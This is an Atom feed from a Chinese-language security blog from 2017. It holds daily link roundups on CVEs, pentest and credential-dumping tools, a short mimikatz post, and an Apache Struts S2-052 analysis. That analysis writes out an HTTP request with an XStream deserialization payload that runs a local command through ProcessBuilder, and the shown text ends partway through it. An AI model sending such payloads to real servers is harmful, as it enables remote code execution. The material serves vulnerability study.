<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M0rk&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://kevien.github.io/"/>
  <updated>2017-09-21T05:54:05.000Z</updated>
  <id>http://kevien.github.io/</id>
  
  <author>
    <name>M0rk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>20170921安全动态</title>
    <link href="http://kevien.github.io/2017/09/21/20170921%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/21/20170921安全动态/</id>
    <published>2017-09-21T02:32:52.000Z</published>
    <updated>2017-09-21T05:54:05.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>针对 NFS 的渗透测试<br><a href="https://pentestacademy.wordpress.com/2017/09/20/nfs/" target="_blank" rel="external">https://pentestacademy.wordpress.com/2017/09/20/nfs/</a></li>
<li>Joomla! &lt;= 3.7.5 LDAP 注入漏洞详情（CVE-2017-14596）<br><a href="https://blog.ripstech.com/2017/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/" target="_blank" rel="external">https://blog.ripstech.com/2017/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/</a></li>
<li>retire.js - 一款用于检测 JavaScript 库是否存在已知漏洞的工具<br><a href="https://github.com/RetireJS/retire.js" target="_blank" rel="external">https://github.com/RetireJS/retire.js</a></li>
<li><p>racer - 一键式应用，可用于测试条件竞争<br><a href="https://github.com/sakurity/racer" target="_blank" rel="external">https://github.com/sakurity/racer</a><br><a href="https://github.com/insp3ctre/race-the-web" target="_blank" rel="external">https://github.com/insp3ctre/race-the-web</a><br><a href="http://racetheweb.io/bank" target="_blank" rel="external">http://racetheweb.io/bank</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这个不错值得研究一下。</div></pre></td></tr></table></figure>
</li>
<li><p>滥用 DLL 延迟加载实现远程代码注入<br><a href="http://hatriot.github.io/blog/2017/09/19/abusing-delay-load-dll/" target="_blank" rel="external">http://hatriot.github.io/blog/2017/09/19/abusing-delay-load-dll/</a></p>
</li>
<li>Tomcat 远程代码执行漏洞分析（CVE-2017-12615）及补丁 Bypass，来自腾讯云鼎实验室的分析<br><a href="http://www.freebuf.com/vuls/148283.html" target="_blank" rel="external">http://www.freebuf.com/vuls/148283.html</a></li>
<li>蓝牙协议 Android 信息泄露漏洞 (CVE-2017-0785/Blueborne) 的 PoC<br><a href="https://github.com/ojasookert/CVE-2017-0785" target="_blank" rel="external">https://github.com/ojasookert/CVE-2017-0785</a></li>
<li>CVE-2016-10191 FFmpeg RTMP Heap Buffer Overflow 漏洞分析及利用，来自 蚂蚁金服巴斯光年安全实验室<br><a href="http://jaq.alibaba.com/community/art/show?articleid=1074" target="_blank" rel="external">http://jaq.alibaba.com/community/art/show?articleid=1074</a></li>
<li>Burp Suite被曝存在远程代码执行漏洞<br><a href="http://bobao.360.cn/news/detail/4334.html" target="_blank" rel="external">http://bobao.360.cn/news/detail/4334.html</a></li>
<li>Windows内核池喷射的乐趣<br><a href="http://bobao.360.cn/learning/detail/4439.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4439.html</a></li>
<li>java反序列化的漏洞<br><a href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/" target="_blank" rel="external">https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/</a></li>
<li>DenyAll WAF远程代码执行漏洞<br><a href="https://pentest.blog/advisory-denyall-web-application-firewall-unauthenticated-remote-code-execution/" target="_blank" rel="external">https://pentest.blog/advisory-denyall-web-application-firewall-unauthenticated-remote-code-execution/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;针对 NFS 的渗透测试&lt;br&gt;&lt;a href=&quot;https://pentestacademy.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>windows认证机制以及常见密码获取工具分析</title>
    <link href="http://kevien.github.io/2017/09/20/windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/"/>
    <id>http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/</id>
    <published>2017-09-20T07:22:16.000Z</published>
    <updated>2017-09-21T07:11:35.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><ul>
<li>先来了解一下lsass进程。<br>Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.<a href="https://www.wikiwand.com/en/Local_Security_Authority_Subsystem_Service" target="_blank" rel="external">link</a></li>
<li>NTLM</li>
<li>Kerberos<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4></li>
<li>内存导出<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/procdump.png" alt=""></li>
<li>从本地获取密码<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzdmp.png" alt=""><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ee663293(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/ee663293(v=vs.85).aspx</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378747(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa378747(v=vs.85).aspx</a></li>
<li><a href="http://blog.csdn.net/qq_26886929/article/details/53905654" target="_blank" rel="external">http://blog.csdn.net/qq_26886929/article/details/53905654</a></li>
<li><a href="http://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="external">http://blog.csdn.net/wulantian/article/details/42418231</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/wiki</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;先来了解一下lsass进程。&lt;br&gt;Local Security Authority Subsystem Service (LS
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170920安全动态</title>
    <link href="http://kevien.github.io/2017/09/20/20170920%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/20/20170920安全动态/</id>
    <published>2017-09-20T02:43:00.000Z</published>
    <updated>2017-09-20T05:30:21.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>我如何使用Cloud Fuzzing挖到了一个Tcpdump漏洞<br><a href="http://www.freebuf.com/articles/network/147955.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/147955.html</a></li>
<li>Introducing pywintrace: A Python Wrapper for ETW<br><a href="https://www.fireeye.com/blog/threat-research/2017/09/pywintrace-python-wrapper-for-etw.html" target="_blank" rel="external">https://www.fireeye.com/blog/threat-research/2017/09/pywintrace-python-wrapper-for-etw.html</a></li>
<li>如何搭建一个便携式蜂窝网络<br><https: mbro95.github.io="" portablecellnetwork=""></https:></li>
<li>如何设计一个系统，能够抵抗住 Apache Struts S2-045（CVE-2017-5638）漏洞攻击<br><https: 18="" 2017="" alexgaynor.net="" sep="" surviving-struts-cve=""></https:></li>
<li>如何搭建一个分布式 Web 爬虫系统<br><a href="https://benbernardblog.com/the-tale-of-creating-a-distributed-web-crawler/" target="_blank" rel="external">https://benbernardblog.com/the-tale-of-creating-a-distributed-web-crawler/</a></li>
<li>smbmap：用于SMB枚举的工具<br><a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="external">https://github.com/ShawnDEvans/smbmap</a></li>
<li>Detecting debuggers by abusing a bad assumption within Windows<br><a href="http://www.triplefault.io/2017/08/detecting-debuggers-by-abusing-bad.html" target="_blank" rel="external">http://www.triplefault.io/2017/08/detecting-debuggers-by-abusing-bad.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;我如何使用Cloud Fuzzing挖到了一个Tcpdump漏洞&lt;br&gt;&lt;a href=&quot;htt
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170919安全动态</title>
    <link href="http://kevien.github.io/2017/09/19/20170919%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/19/20170919安全动态/</id>
    <published>2017-09-19T02:33:04.000Z</published>
    <updated>2017-09-19T07:15:55.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>《 The Python Bites your Apple：Fuzzing and exploiting OSX Kernel bugs》，《蛇噬汝果：基于Python的OSX内核漏洞模糊测试挖掘和利用》，来自科恩实验室 Flanker 在 XKungfoo 2016 会议的演讲<br><a href="https://papers.put.as/papers/macosx/2016/xkungfoo.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/xkungfoo.pdf</a></li>
<li>恶意 Chrome 插件分析<br><a href="https://blog.0day.rocks/malicious-chrome-extension-meddling-with-your-searches-581aa56ddc9c" target="_blank" rel="external">https://blog.0day.rocks/malicious-chrome-extension-meddling-with-your-searches-581aa56ddc9c</a></li>
<li>探测 mimikatz 以及其他可疑的 lsass 访问 - Part 1<br><a href="https://www.eideon.com/2017-09-09-THL01-Mimikatz/" target="_blank" rel="external">https://www.eideon.com/2017-09-09-THL01-Mimikatz/</a></li>
<li>RDP劫持 - 如何透明地劫持 RDS 和 RemoteApp 会话<br><a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#58;&#104;&#116;&#x74;&#x70;&#x73;&#58;&#x2f;&#47;&#109;&#x65;&#100;&#105;&#117;&#x6d;&#x2e;&#x63;&#x6f;&#109;&#x2f;&#64;&#x6e;&#101;&#x74;&#119;&#x6f;&#114;&#107;&#115;&#x65;&#x63;&#x75;&#x72;&#105;&#116;&#121;&#47;&#x72;&#100;&#112;&#45;&#x68;&#x69;&#x6a;&#97;&#99;&#x6b;&#105;&#110;&#103;&#45;&#x68;&#111;&#x77;&#x2d;&#116;&#x6f;&#45;&#x68;&#x69;&#106;&#x61;&#x63;&#107;&#x2d;&#x72;&#x64;&#115;&#x2d;&#x61;&#110;&#x64;&#x2d;&#x72;&#x65;&#x6d;&#111;&#x74;&#101;&#x61;&#x70;&#x70;&#45;&#x73;&#x65;&#115;&#115;&#x69;&#x6f;&#110;&#x73;&#x2d;&#x74;&#114;&#x61;&#110;&#x73;&#x70;&#x61;&#114;&#x65;&#110;&#116;&#108;&#121;&#x2d;&#x74;&#111;&#45;&#x6d;&#111;&#x76;&#x65;&#45;&#x74;&#x68;&#114;&#111;&#117;&#x67;&#x68;&#x2d;&#97;&#110;&#45;&#100;&#x61;&#50;&#x61;&#x31;&#x65;&#55;&#x33;&#x61;&#53;&#102;&#54;&#x3f;&#115;&#x6f;&#x75;&#114;&#99;&#101;&#x3d;&#x6c;&#105;&#x6e;&#x6b;&#83;&#x68;&#97;&#114;&#x65;&#45;&#x37;&#100;&#98;&#x36;&#x64;&#50;&#x64;&#x66;&#x34;&#x32;&#x61;&#54;&#45;&#49;&#53;&#x30;&#53;&#54;&#x38;&#54;&#x31;&#53;&#50;">&#104;&#116;&#x74;&#x70;&#x73;&#58;&#x2f;&#47;&#109;&#x65;&#100;&#105;&#117;&#x6d;&#x2e;&#x63;&#x6f;&#109;&#x2f;&#64;&#x6e;&#101;&#x74;&#119;&#x6f;&#114;&#107;&#115;&#x65;&#x63;&#x75;&#x72;&#105;&#116;&#121;&#47;&#x72;&#100;&#112;&#45;&#x68;&#x69;&#x6a;&#97;&#99;&#x6b;&#105;&#110;&#103;&#45;&#x68;&#111;&#x77;&#x2d;&#116;&#x6f;&#45;&#x68;&#x69;&#106;&#x61;&#x63;&#107;&#x2d;&#x72;&#x64;&#115;&#x2d;&#x61;&#110;&#x64;&#x2d;&#x72;&#x65;&#x6d;&#111;&#x74;&#101;&#x61;&#x70;&#x70;&#45;&#x73;&#x65;&#115;&#115;&#x69;&#x6f;&#110;&#x73;&#x2d;&#x74;&#114;&#x61;&#110;&#x73;&#x70;&#x61;&#114;&#x65;&#110;&#116;&#108;&#121;&#x2d;&#x74;&#111;&#45;&#x6d;&#111;&#x76;&#x65;&#45;&#x74;&#x68;&#114;&#111;&#117;&#x67;&#x68;&#x2d;&#97;&#110;&#45;&#100;&#x61;&#50;&#x61;&#x31;&#x65;&#55;&#x33;&#x61;&#53;&#102;&#54;&#x3f;&#115;&#x6f;&#x75;&#114;&#99;&#101;&#x3d;&#x6c;&#105;&#x6e;&#x6b;&#83;&#x68;&#97;&#114;&#x65;&#45;&#x37;&#100;&#98;&#x36;&#x64;&#50;&#x64;&#x66;&#x34;&#x32;&#x61;&#54;&#45;&#49;&#53;&#x30;&#53;&#54;&#x38;&#54;&#x31;&#53;&#50;</a></li>
<li>Microsoft Office 有哪些特性可以被后门用来实现常驻（Persist），来自 MWR Labs<br><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/WilliamKnowles-MWR-44con-PersistingWithMicrosoftOffice.pdf" target="_blank" rel="external">https://labs.mwrinfosecurity.com/assets/BlogFiles/WilliamKnowles-MWR-44con-PersistingWithMicrosoftOffice.pdf</a></li>
<li>JSLinux - 在浏览器里运行 Linux 系统<br><a href="https://bellard.org/jslinux/" target="_blank" rel="external">https://bellard.org/jslinux/</a></li>
<li>idahunt  - NCCGroup 开源的用于辅助 IDA Pro 逆向分析的工具，譬如批量分析二进制文件<br><a href="https://github.com/nccgroup/idahunt" target="_blank" rel="external">https://github.com/nccgroup/idahunt</a></li>
<li>Active Directory ACL 的攻与防<br><a href="https://blogs.technet.microsoft.com/enterprisemobility/2017/09/18/active-directory-access-control-list-attacks-and-defense/" target="_blank" rel="external">https://blogs.technet.microsoft.com/enterprisemobility/2017/09/18/active-directory-access-control-list-attacks-and-defense/</a></li>
<li>Windows 系统中进程、线程的枚举以及 Image 加载通知的回调<br><a href="http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html" target="_blank" rel="external">http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html</a></li>
<li>Empire中的Invoke-WScriptBypassUAC利用分析<br><a href="https://3gstudent.github.io/3gstudent.github.io/Empire%E4%B8%AD%E7%9A%84Invoke-WScriptBypassUAC%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Empire%E4%B8%AD%E7%9A%84Invoke-WScriptBypassUAC%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</a></li>
<li>OAuth 2.0 标准实现中的常见漏洞<br><a href="https://blog.avuln.com/article/4" target="_blank" rel="external">https://blog.avuln.com/article/4</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;《 The Python Bites your Apple：Fuzzing and exploi
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170918安全动态</title>
    <link href="http://kevien.github.io/2017/09/18/20170918%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/18/20170918安全动态/</id>
    <published>2017-09-18T05:27:10.000Z</published>
    <updated>2017-09-18T10:41:21.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>游戏辅助背后的黑产流水线：年劫持攻击千万次牟利数百万<br><a href="http://www.freebuf.com/articles/network/147652.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/147652.html</a></li>
<li>理解 V8 字节码<br><a href="https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775" target="_blank" rel="external">https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775</a></li>
<li>v8 引擎实现了 Type profiling，可在运行时收集类型信息<br><a href="https://medium.com/fhinkel/runtime-type-information-for-javascript-b134faac3c0a" target="_blank" rel="external">https://medium.com/fhinkel/runtime-type-information-for-javascript-b134faac3c0a</a></li>
<li>反取证技术 - 将进程隐藏在内核模式中<br><a href="https://www.cert-devoteam.fr/publications/en/antiforensics-techniques-process-hiding-in-kernel-mode/" target="_blank" rel="external">https://www.cert-devoteam.fr/publications/en/antiforensics-techniques-process-hiding-in-kernel-mode/</a></li>
<li>在 PyPI(Python包索引) 上发现十个恶意的库<br><a href="https://www.bleepingcomputer.com/news/security/ten-malicious-libraries-found-on-pypi-python-package-index/?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter#238993254-tw#1505552853415" target="_blank" rel="external">https://www.bleepingcomputer.com/news/security/ten-malicious-libraries-found-on-pypi-python-package-index/?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter#238993254-tw#1505552853415</a></li>
<li>macphish - 生成 Office for Mac 宏 Payload 的工具<br><a href="https://github.com/cldrn/macphish" target="_blank" rel="external">https://github.com/cldrn/macphish</a></li>
<li>Windows kernel pool spraying fun<br>Part 3 : <a href="https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-3.html" target="_blank" rel="external">https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-3.html</a>  </li>
</ul>
<p>Part 2：<a href="https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-2.html" target="_blank" rel="external">https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-2.html</a>  </p>
<p>Part  1： <a href="https://theevilbit.blogspot.in/2017/09/pool-spraying-fun-part-1.html" target="_blank" rel="external">https://theevilbit.blogspot.in/2017/09/pool-spraying-fun-part-1.html</a></p>
<ul>
<li>一次服务器被攻击的应急行动<br><a href="http://www.4hou.com/technology/7653.html" target="_blank" rel="external">http://www.4hou.com/technology/7653.html</a></li>
<li>Xdebug: A Tiny Attack Surface<br><a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="external">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface</a></li>
<li>利用 WinAFL 来 fuzz MSXML library<br><a href="https://symeonp.github.io/2017/09/17/fuzzing-winafl.html" target="_blank" rel="external">https://symeonp.github.io/2017/09/17/fuzzing-winafl.html</a></li>
<li>An Introduction to Printer Exploitation #1<br><a href="https://0x00sec.org/t/an-introduction-to-printer-exploitation-1/3565" target="_blank" rel="external">https://0x00sec.org/t/an-introduction-to-printer-exploitation-1/3565</a></li>
<li>除了拖拽（Drag’n’Drop），VMware 还有哪些攻击面？Comsecuris 去年为了准备 Pwn2Own 开始挖掘 VMware 的漏洞，可惜最后由于时间原因没能赶上。这篇 Blog 来自他们对 Vmware 攻击界面的剖析以及他们发现的漏洞<br><a href="https://comsecuris.com/blog/posts/vmware_vgpu_shader_vulnerabilities/" target="_blank" rel="external">https://comsecuris.com/blog/posts/vmware_vgpu_shader_vulnerabilities/</a></li>
<li>pyDHE：一个完整的Python Diffie-Hellman库<br><a href="https://github.com/deadPix3l/pyDHE" target="_blank" rel="external">https://github.com/deadPix3l/pyDHE</a></li>
<li>在Windows中枚举进程，线程和映像加载通知回调例程<br><a href="http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html" target="_blank" rel="external">http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html</a></li>
<li>针对Flash应用程序的渗透测试<br><a href="https://privsec.blog/penetration-testing-flash-apps-aka-how-to-cheat-at-blackjack/" target="_blank" rel="external">https://privsec.blog/penetration-testing-flash-apps-aka-how-to-cheat-at-blackjack/</a></li>
<li>githubscan：GitHub敏感信息扫描工具<br><a href="https://github.com/lianfeng30/githubscan" target="_blank" rel="external">https://github.com/lianfeng30/githubscan</a></li>
<li>挖漏洞的高级方法<br><a href="http://jackson.thuraisamy.me/finding-vulnerabilities.html" target="_blank" rel="external">http://jackson.thuraisamy.me/finding-vulnerabilities.html</a></li>
<li><p>LaZagne：浏览器密码凭证获取<br><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="external">https://github.com/AlessandroZ/LaZagne</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">很早就关注的一个项目了，还一直在更新。</div></pre></td></tr></table></figure>
</li>
<li><p>CVE-2016-0040：Privilege Escalation Exploit For WMI Receive Notification Vulnerability (x86-64)<br><https: github.com="" de7ec7ed="" cve-2016-0040=""></https:></p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;游戏辅助背后的黑产流水线：年劫持攻击千万次牟利数百万&lt;br&gt;&lt;a href=&quot;http://ww
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>struts-052和struts-053分析</title>
    <link href="http://kevien.github.io/2017/09/17/struts-052%E5%92%8Cstruts-053%E5%88%86%E6%9E%90/"/>
    <id>http://kevien.github.io/2017/09/17/struts-052和struts-053分析/</id>
    <published>2017-09-17T09:07:22.000Z</published>
    <updated>2017-09-20T07:51:40.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。</p>
<h4 id="s2-052"><a href="#s2-052" class="headerlink" title="s2-052"></a>s2-052</h4><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="external">官方通告</a><br>在分析这个漏洞之前，先补补基础知识。<br><br>了解一下xstream这个包，看一下官方的一句话介绍，XStream is a simple library to serialize objects to XML and back again.就是一个序列化java对象为xml以及将xml反序列化为java对象。<br><br><img src="/2017/09/17/struts-052和struts-053分析/xmlGenMain.png" alt=""><br>我们可以看到，通过XMLGenerator.generateXML的方法就进行了序列化，而通过XMLGenerator.generateTOfromXML就进行了反序列化。这个XMLGenerator类的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">import com.thoughtworks.xstream.XStream;</div><div class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</div><div class="line"></div><div class="line">public final class XMLGenerator &#123;</div><div class="line">/*</div><div class="line"> * this class is for generating XML </div><div class="line"> */</div><div class="line"> </div><div class="line"> /*</div><div class="line">  * initialization of XStream class </div><div class="line">  */</div><div class="line"> private static XStream xstream = new XStream(new DomDriver())</div><div class="line"> &#123;&#123;</div><div class="line">  processAnnotations(Square.class);</div><div class="line">  processAnnotations(Rectangle.class);</div><div class="line"> &#125;&#125;;</div><div class="line"> </div><div class="line"> /*</div><div class="line">  * This class is for generating XML from MODEL class</div><div class="line">  * @param Object</div><div class="line">  * @return String </div><div class="line">  */</div><div class="line"> public static String generateXML(Object to) &#123;</div><div class="line">  return null == to ? &quot;&quot; : xstream.toXML(to);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> /*</div><div class="line">  * Generates the transfer object from the given XML using XStream.</div><div class="line">  * </div><div class="line">  * @param String</div><div class="line">  * @return transfer object</div><div class="line">  */</div><div class="line"> public static Object generateTOfromXML(String xml) &#123;</div><div class="line">  return xstream.fromXML(xml);</div><div class="line"> &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里就用到了XStream。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">POST /struts2-rest-showcase/orders/3 HTTP/1.1</div><div class="line">Host: localhost:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 2430</div><div class="line"></div><div class="line">&lt;map&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">      &lt;flags&gt;0&lt;/flags&gt;</div><div class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</div><div class="line">        &lt;dataHandler&gt;</div><div class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</div><div class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</div><div class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</div><div class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</div><div class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</div><div class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</div><div class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">                      &lt;command&gt;</div><div class="line">                        &lt;string&gt;open&lt;/string&gt;</div><div class="line">                        &lt;string&gt;/Applications/Calculator.app&lt;/string&gt;</div><div class="line">                      &lt;/command&gt;</div><div class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</div><div class="line">                    &lt;/next&gt;</div><div class="line">                  &lt;/iter&gt;</div><div class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</div><div class="line">                    &lt;method&gt;</div><div class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</div><div class="line">                      &lt;name&gt;start&lt;/name&gt;</div><div class="line">                      &lt;parameter-types/&gt;</div><div class="line">                    &lt;/method&gt;</div><div class="line">                    &lt;name&gt;foo&lt;/name&gt;</div><div class="line">                  &lt;/filter&gt;</div><div class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</div><div class="line">                &lt;/serviceIterator&gt;</div><div class="line">                &lt;lock/&gt;</div><div class="line">              